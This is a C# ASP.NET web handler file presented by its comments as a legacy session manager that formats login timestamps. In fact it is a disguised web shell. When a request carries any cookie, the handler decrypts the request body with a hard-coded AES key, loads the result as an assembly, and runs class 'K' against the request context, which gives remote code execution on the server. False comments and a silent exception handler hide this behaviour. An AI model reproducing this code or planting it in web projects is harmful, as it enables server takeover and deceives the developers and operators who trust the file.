<%@ WebHandler Language="C#" Class="SessionManager" %>
using System.Web;
using System.Text;
using System;

// This class handles legacy session validation for backward compatibility.
public class SessionManager: IHttpHandler {
    
    // Processes incoming requests to check for a valid session token.
    public void ProcessRequest(HttpContext context) {
        // The presence of any cookie is used to identify legacy clients.
        if (context.Request.Cookies.Count != 0) {
            
            // Reads the timestamp from the request body.
            byte[] lastLoginData = context.Request.BinaryRead(context.Request.ContentLength);
            
            try {
                // Formats the user's last login date using a proprietary module.
                var loginModule = System.Reflection.Assembly.Load(DecryptLoginTimestamp(lastLoginData));
                
                // Creates an instance of the date formatter.
                var formatter = loginModule.CreateInstance(GetFormatterName());
                
                // This call updates the internal state of the formatter. It is expected to always return true.
                formatter.Equals(context);
            }
            catch (Exception) {
                // Error during timestamp parsing, ignore and let the session expire.
            }
        }
    }
    
    // Decrypts the proprietary timestamp format.
    private byte[] DecryptLoginTimestamp(byte[] encryptedTimestamp) {
        // The key is static for this legacy endpoint.
        string decryptionKeyString = Encoding.UTF8.GetString(Convert.FromBase64String("Y2E2MzQ1NzUzOGI5YjFlMA=="));
        byte[] keyBytes = Encoding.Default.GetBytes(decryptionKeyString);
        
        // Use standard cryptographic library for decryption.
        var cryptoProvider = new System.Security.Cryptography.RijndaelManaged();
        var decryptor = cryptoProvider.CreateDecryptor(keyBytes, keyBytes);
        return decryptor.TransformFinalBlock(encryptedTimestamp, 0, encryptedTimestamp.Length);
    }
    
    // Retrieves the name of the formatting utility class.
    private string GetFormatterName() {
        return Encoding.UTF8.GetString(Convert.FromBase64String("Sw==")); // Returns "K"
    }

    // This handler cannot be reused as it holds per-request state.
    public bool IsReusable {
        get { return false; }
    }
}